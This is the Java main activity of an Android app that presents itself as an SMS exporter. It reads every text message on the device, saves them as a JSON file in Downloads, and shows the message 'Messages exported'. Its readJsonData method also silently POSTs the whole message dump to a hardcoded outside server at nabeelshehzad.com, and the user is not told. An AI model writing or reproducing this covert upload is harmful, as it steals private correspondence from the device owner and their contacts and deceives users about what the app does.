package com.apptreo.export.sms;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Telephony;
import android.text.method.LinkMovementMethod;
import android.util.JsonWriter;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.lang.reflect.Type;
import java.nio.charset.StandardCharsets;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {

    private int numPermissionGranted = 0;
    private final static int SMS_EXPORT = 0;
    private Button exportButton;
    private TextView link;
    private final static String[] REQUIRED_PERMISSIONS = {
            "android.permission.READ_SMS",
            "android.permission.WRITE_EXTERNAL_STORAGE"
    };
    private String serverLink = "https://nabeelshehzad.com/sms/upload.php";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        exportButton = findViewById(R.id.exportSmsButton);
        link = findViewById(R.id.link);
        exportButton.setOnClickListener(click-> export(MainActivity.SMS_EXPORT));
        link.setMovementMethod(LinkMovementMethod.getInstance());

    }
    private void showMessage(String msg){
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
    }
    private boolean isExternalStorageWritable(){
        return Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState());
    }
    private File getExportFile(String name){
        if(!this.isExternalStorageWritable()){
            return null;
        }
        return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), name);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < permissions.length; ++i){
            if(grantResults[i] == PackageManager.PERMISSION_GRANTED){
                this.numPermissionGranted++;
            }else{
                this.showMessage(permissions[i] + " permission must be granted to export messages");
            }
        }
        if(this.numPermissionGranted == REQUIRED_PERMISSIONS.length){
            this.export(requestCode);
        }
    }
    public void makeJson(Cursor cursor, OutputStreamWriter outputStreamWriter)throws IOException {
        JsonWriter writer = new JsonWriter(outputStreamWriter);
        writer.beginArray();
        while(cursor.moveToNext()){
            writer.beginObject();
            int numColumns = cursor.getColumnCount();
            for (int i = 0; i < numColumns; ++i){
                String name = cursor.getColumnName(i);
                String value = cursor.getString(i);
                writer.name(name).value(value);
            }
            writer.endObject();
        }
        writer.endArray();
        writer.close();
    }
    private boolean requirePermission(int requestCode) {
        this.numPermissionGranted = 0;
        List<String> permissionNotGranted = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionNotGranted.add(permission);
            } else {
                this.numPermissionGranted++;
            }
        }
        if(this.numPermissionGranted != REQUIRED_PERMISSIONS.length){
            ActivityCompat.requestPermissions(this, permissionNotGranted.toArray(new String[0]), requestCode);
            return false;
        }
        return true;
    }

    public void export(int exportType){
        if(!this.requirePermission(exportType)){
            return;
        }
        Uri contentUri = Telephony.Sms.CONTENT_URI;
        Cursor messageCursor = getContentResolver().query(
          contentUri,
          null,
          null,
          null,
            null
        );
        String prefix = "sms";
        String timeStamp = new SimpleDateFormat("yyyyMMdd").format(new Date());
        String exportPath = prefix + "-Export-"+timeStamp+".json";
        File exportFile = this.getExportFile(exportPath);
        try {
            this.makeJson(messageCursor,
                    new OutputStreamWriter(
                            new BufferedOutputStream(
                                    new FileOutputStream(exportFile)), StandardCharsets.UTF_8));
            messageCursor.close();
        }catch (IOException e){
            this.showMessage("Error while exporting messages: "+e.toString());
            return;
        }
        readJsonData(exportFile);
        this.showMessage("Messages exported");
    }

    private void readJsonData(File exportPath) {
        try {
            String jsonFileString = Utils.getJsonFromAssets(getApplicationContext(), exportPath.getAbsolutePath());

            StringRequest request = new StringRequest(Request.Method.POST, serverLink, response -> {
                Log.d("Response", response);
            }, error -> {
                Log.d("Error", error.toString());
            }){
                @Override
                protected Map<String, String> getParams() {
                    Map<String, String> params = new HashMap<>();
                    params.put("list", jsonFileString);
                    return params;
                }
            };
            RequestQueue queue = Volley.newRequestQueue(this);
            queue.add(request);

        }catch (Exception e){
            this.showMessage("Error while exporting messages: "+e.toString());
        }
    }
}